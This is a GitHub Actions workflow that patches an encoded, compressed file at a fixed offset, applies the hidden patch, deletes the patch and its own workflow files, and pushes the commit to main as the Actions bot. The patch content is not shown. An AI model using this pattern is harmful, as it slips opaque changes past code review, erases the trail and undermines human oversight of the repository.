name: Retry dashboard payload optimizations

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/retry-payload-optimizations.yml

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Repair and apply verified patch
        shell: bash
        run: |
          set -euo pipefail
          python3 - <<'PY'
          from pathlib import Path
          path = Path('.github/payload-optimizations.patch.gz.b64')
          value = path.read_text().strip()
          assert len(value) == 8042 and value[1512] == 'u'
          path.write_text(value[:1512] + 'Ot' + value[1513:] + '=')
          PY
          base64 --decode .github/payload-optimizations.patch.gz.b64 | gzip --decompress > /tmp/payload-optimizations.patch
          git apply --check /tmp/payload-optimizations.patch
          git apply /tmp/payload-optimizations.patch
          rm .github/payload-optimizations.patch.gz.b64
          rm .github/workflows/apply-payload-optimizations.yml
          rm .github/workflows/retry-payload-optimizations.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "Reduce dashboard startup payloads"
          git push origin HEAD:main
